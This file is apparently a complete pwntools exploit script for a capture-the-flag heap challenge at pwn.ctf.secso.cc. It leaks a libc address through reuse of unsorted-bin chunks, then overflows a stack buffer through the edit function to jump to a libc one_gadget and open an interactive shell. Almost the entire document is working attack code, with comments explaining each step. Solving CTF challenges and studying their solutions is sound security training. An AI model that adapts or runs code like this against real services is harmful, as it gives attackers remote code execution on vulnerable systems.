from pwn import *


target = remote("pwn.ctf.secso.cc", 5001)
libc = ELF("./libc-2.31.so")

def allocate(key, data, size):
	target.recvuntil("> ")
	target.sendline("1")
	target.recvuntil(": ")
	target.sendline(key)
	target.recvuntil(": ")
	target.sendline(str(size))
	target.recvuntil(": ")
	target.send(data)

def delete(key):
	target.recvuntil("> ")
	target.sendline("2")
	target.recvuntil(": ")
	target.sendline(key)

def edit(key, data, size):
	target.recvuntil("> ")
	target.sendline("3")
	target.recvuntil(": ")
	target.sendline(key)
	target.recvuntil(": ")
	target.sendline(str(size))
	target.recvuntil(": ")
	target.send(data)

def view(key):
	target.recvuntil("> ")
	target.sendline("4")
	target.recvuntil(": ")
	target.sendline(key)
	return target.recvline()

# PIE enabled, we want a libc leak
# allocate two sets of chunks - second set is to prevent wilderness consolidation, the first 'data' chunk should be large enough to go to unsorted
# free first set of chunks - first data chunk goes to unsorted, gets libc addresses in it
# reallocate first set of chunks - write 8 bytes into data chunk. This mangles first libc leak, but second libc addr is untouched

allocate("a", "b\n", 0x500)
allocate("\0"*8, "\0"*8, 0x20)
delete("a")
allocate("a", "b"*8, 0x8)

libc_leak = view("a")
print(libc_leak)
libc_leak = libc_leak[8:14]
libc_leak = int.from_bytes(libc_leak, byteorder='little')
print(hex(libc_leak))
libc.address = libc_leak - 0x1ed010
print(hex(libc.address))

# Next - edit, delete, view - all have overflows in key variable on stack
# only enough for one rop gadget though
# one_gadget utility, check the return epilogues of each function
# edit looks promising - rdx = size input to function, rsi = data pointer IF we match a chunk
	# second chunk set we allocate, make data field all 0's
	# make the key something we can match, then continue overflow - i just choose alll 0's
	# set size to 0
	# one_gadget works
buf = b"\0\0\0\0\0\0\0\0" + b"A"*48
buf += p64(libc.address + 0xe3b04)
edit(buf, "",0)

target.interactive()
